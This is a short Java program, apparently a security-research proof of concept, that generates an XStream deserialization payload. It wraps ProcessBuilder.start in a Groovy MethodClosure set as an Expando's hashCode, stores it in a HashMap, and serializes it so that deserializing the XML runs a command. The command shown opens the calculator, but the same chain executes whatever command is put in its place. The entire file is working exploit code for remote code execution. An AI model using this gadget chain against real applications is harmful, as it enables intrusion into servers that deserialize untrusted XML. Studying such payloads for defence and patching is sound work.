import com.thoughtworks.xstream.XStream;
import groovy.util.Expando;
import org.codehaus.groovy.runtime.MethodClosure;

import java.util.HashMap;
import java.util.Map;

public class ExpandoPayload {

    public static void main(String[] args) {
        Map map = new HashMap<Expando, Integer>();
        Expando expando = new Expando();

        MethodClosure methodClosure = new MethodClosure(new ProcessBuilder(new String[]{"open", "-a", "calculator"}), "start");
        expando.setProperty("hashsCode", methodClosure);
        map.put(expando, 123);

        XStream xs = new XStream();
        String xml = xs.toXML(map).replace("hashsCode","hashCode");
        System.out.println(xml);
    }
}
